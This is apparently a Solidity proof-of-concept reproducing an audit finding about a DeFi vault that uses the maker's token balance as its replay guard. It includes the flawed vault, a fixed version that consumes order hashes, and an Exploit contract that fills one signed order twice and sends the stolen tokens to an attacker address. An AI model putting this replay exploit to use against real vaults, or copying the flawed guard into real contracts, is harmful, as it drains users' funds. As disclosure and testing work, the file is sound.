// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Barter DAO (Superposition) finding
// 63501: "Replay Attack via Balance-Based Nonce" (MixBytes).
//
// SuperpositionVault.swap authenticates a maker's signed order and then guards
// against replay using ONLY the maker's current makerToken balance as a nonce
// (verbatim, SuperpositionVault.sol L115-L118):
//
//     uint256 currentMakerBalance = order.makerToken.balanceOf(order.maker);
//     if (currentMakerBalance < order.nonceBalance) {
//         revert ReplayAttackDetected(currentMakerBalance, order.nonceBalance);
//     }
//
// The signature is never consumed. After a fill the maker's makerToken balance
// drops below nonceBalance, so the guard temporarily blocks replay — but as soon
// as the maker's balance RECOVERS (a deposit / transfer from any unrelated
// source), the SAME signed order passes the guard again and executes a second,
// unauthorized fill. A single signed order authorizing 100 makerToken is filled
// twice, draining 200 makerToken from the maker to the taker (attacker).
//
// The fixed variant (SuperpositionVaultFixed) consumes the order hash — modelling
// descent from OpenZeppelin's `Nonces` — so the second submission reverts.
// ─────────────────────────────────────────────────────────────────────────────

// ─────────────────────────────────────────────────────────────────────────────
// Minimal ERC20 double for the opaque token boundary (maker/taker tokens).
// ─────────────────────────────────────────────────────────────────────────────
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Shared signed-order type + hashing (used by both vault variants).
// ─────────────────────────────────────────────────────────────────────────────
struct Order {
    address maker;
    MiniToken makerToken;
    MiniToken takerToken;
    uint256 makerAmount;
    uint256 takerAmount;
    uint256 nonceBalance;
    uint256 deadline;
}

function hashOrder(Order memory order) pure returns (bytes32) {
    return keccak256(
        abi.encode(
            order.maker,
            address(order.makerToken),
            address(order.takerToken),
            order.makerAmount,
            order.takerAmount,
            order.nonceBalance,
            order.deadline
        )
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// EIP-1271 contract signer (the maker). Genuinely authorizes an order hash once;
// the authorization is NOT consumed — faithful to the finding, where a signature
// is not a nonce and only the balance check guards replay.
// ─────────────────────────────────────────────────────────────────────────────
interface IERC1271 {
    function isValidSignature(bytes32 hash, bytes calldata signature) external view returns (bytes4);
}

contract MakerWallet is IERC1271 {
    bytes4 internal constant MAGIC = 0x1626ba7e;
    address public owner;
    mapping(bytes32 => bool) public signed;

    constructor() {
        owner = msg.sender;
    }

    function signOrder(bytes32 orderHash) external {
        require(msg.sender == owner, "not owner");
        signed[orderHash] = true;
    }

    function approveToken(MiniToken token, address spender, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        token.approve(spender, amount);
    }

    function isValidSignature(bytes32 hash, bytes calldata) external view returns (bytes4) {
        return signed[hash] ? MAGIC : bytes4(0xffffffff);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE vault: the ONLY replay guard is the balance-based nonce (verbatim).
// ─────────────────────────────────────────────────────────────────────────────
contract SuperpositionVault {
    error ReplayAttackDetected(uint256 currentMakerBalance, uint256 nonceBalance);
    error InvalidSignature();
    error OrderExpired();

    function swap(Order memory order, bytes calldata signature) external {
        if (block.timestamp > order.deadline) revert OrderExpired();

        bytes32 orderHash = hashOrder(order);
        if (IERC1271(order.maker).isValidSignature(orderHash, signature) != 0x1626ba7e) {
            revert InvalidSignature();
        }

        // ── Balance-based nonce replay guard (verbatim, SuperpositionVault.sol L115-L118).
        //    A recovered maker balance re-enables the SAME signed order → replay. ──
        uint256 currentMakerBalance = order.makerToken.balanceOf(order.maker);
        if (currentMakerBalance < order.nonceBalance) { // @> balance used as a nonce: recovers -> order replayable
            revert ReplayAttackDetected(currentMakerBalance, order.nonceBalance);
        }

        // Settle the swap: maker's makerToken -> taker (msg.sender); taker's takerToken -> maker.
        order.makerToken.transferFrom(order.maker, msg.sender, order.makerAmount);
        order.takerToken.transferFrom(msg.sender, order.maker, order.takerAmount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED vault: consume the order's nonce (models OpenZeppelin `Nonces`) so a
// signed order can be filled at most once, regardless of balance recovery.
// ─────────────────────────────────────────────────────────────────────────────
contract SuperpositionVaultFixed {
    error OrderAlreadyUsed(bytes32 orderHash);
    error InvalidSignature();
    error OrderExpired();

    mapping(bytes32 => bool) public consumed;

    function swap(Order memory order, bytes calldata signature) external {
        if (block.timestamp > order.deadline) revert OrderExpired();

        bytes32 orderHash = hashOrder(order);
        if (IERC1271(order.maker).isValidSignature(orderHash, signature) != 0x1626ba7e) {
            revert InvalidSignature();
        }

        // FIX: single-use nonce. A recovered balance can NOT re-enable the order.
        if (consumed[orderHash]) revert OrderAlreadyUsed(orderHash);
        consumed[orderHash] = true;

        order.makerToken.transferFrom(order.maker, msg.sender, order.makerAmount);
        order.takerToken.transferFrom(msg.sender, order.maker, order.takerAmount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: one signed order authorizing a single 100 makerToken fill is
// filled TWICE (after the maker's balance recovers), draining 200 makerToken to
// the attacker EOA. The stolen makerToken (STOLEN-MAKER) is left at the attacker.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant FILL = 100 ether; // one authorized fill of makerToken
    uint256 internal constant PRICE = 100 ether; // takerToken the taker pays per fill

    MiniToken public makerToken;
    MiniToken public takerToken;
    MakerWallet public maker;
    SuperpositionVault public vault;

    uint256 public firstFillLoot; // makerToken drained on the authorized fill
    uint256 public secondFillLoot; // makerToken drained on the unauthorized replay
    uint256 public attackerLoot; // total makerToken forwarded to the attacker
    uint256 public authorizedAmount; // what the single signature authorized (one FILL)
    address public makerTokenAddr;
    address public vaultAddr;

    constructor() {
        makerToken = new MiniToken("Superposition Maker", "STOLEN-MAKER"); // deploy 0
        takerToken = new MiniToken("Taker USD", "TAKER"); // deploy 1
        maker = new MakerWallet(); // deploy 2
        vault = new SuperpositionVault(); // deploy 3
        makerTokenAddr = address(makerToken);
        vaultAddr = address(vault);
    }

    function run() external payable {
        authorizedAmount = FILL;

        // --- maker holds exactly one fill of makerToken and signs ONE order ---
        makerToken.mint(address(maker), FILL);
        Order memory order = Order({
            maker: address(maker),
            makerToken: makerToken,
            takerToken: takerToken,
            makerAmount: FILL,
            takerAmount: PRICE,
            nonceBalance: FILL, // balance-as-nonce threshold
            deadline: type(uint256).max
        });
        bytes32 orderHash = hashOrder(order);
        maker.signOrder(orderHash);
        maker.approveToken(makerToken, address(vault), type(uint256).max);

        // --- attacker (this contract, the taker) funds & approves takerToken for 2 fills ---
        takerToken.mint(address(this), 2 * PRICE);
        takerToken.approve(address(vault), type(uint256).max);

        // --- fill #1: AUTHORIZED. maker 100 -> 0 ---
        uint256 before1 = makerToken.balanceOf(address(this));
        vault.swap(order, "");
        firstFillLoot = makerToken.balanceOf(address(this)) - before1;
        // guard now blocks replay: maker balance 0 < nonceBalance 100.

        // --- maker's makerToken balance RECOVERS from an unrelated source ---
        makerToken.mint(address(maker), FILL);

        // --- fill #2: REPLAY of the SAME signed order. Passes the balance guard. ---
        uint256 before2 = makerToken.balanceOf(address(this));
        vault.swap(order, "");
        secondFillLoot = makerToken.balanceOf(address(this)) - before2;

        // --- forward the drained makerToken to the attacker EOA (harm receiver) ---
        attackerLoot = makerToken.balanceOf(address(this));
        makerToken.transfer(ATTACKER, attackerLoot);

        // Harm: one signature authorizing a single 100 fill drained 200 to the attacker.
        require(firstFillLoot == FILL, "fill1");
        require(secondFillLoot == FILL, "replay must fill again");
        require(attackerLoot == 2 * FILL, "two fills from one signature");
    }
}
